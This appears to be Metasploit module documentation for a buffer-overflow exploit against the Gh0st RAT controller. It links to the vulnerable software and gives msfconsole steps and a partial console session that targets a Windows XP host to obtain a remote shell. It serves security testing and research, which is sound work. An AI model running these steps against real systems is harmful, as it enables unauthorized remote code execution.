## Vulnerable Application

  This module exploits a buffer overflow in the Gh0st Controller when handling a drive list as received by a victim.
  This vulnerability can allow remote code execution in the context of the user who ran it.
  
  A vulnerable version of the software is available here: [gh0st 3.6](https://github.com/rapid7/metasploit-framework/files/1243297/0efd83a87d2f5359fae051517fdf4eed8972883507fbd3b5145c3757f085d14c.zip)

## Verification Steps

  1. Run the application
  2. Start msfconsole
  3. Do: `use exploit/windows/misc/gh0st`
  4. Do: `set rhost [ip]`
  5. Do: `exploit`
  6. Get a shell

## Options

  **MAGIC**
  
  This is the 5 character magic used by the server.  The default is `Gh0st`

## Scenarios

### Windows XP SP3 with gh0st 3.6

```
msf > use exploit/windows/misc/gh0st 
msf exploit(gh0st) > set rhost 192.168.2.108
rhost => 192.168.2.108
msf exploit(gh0st) > exploit
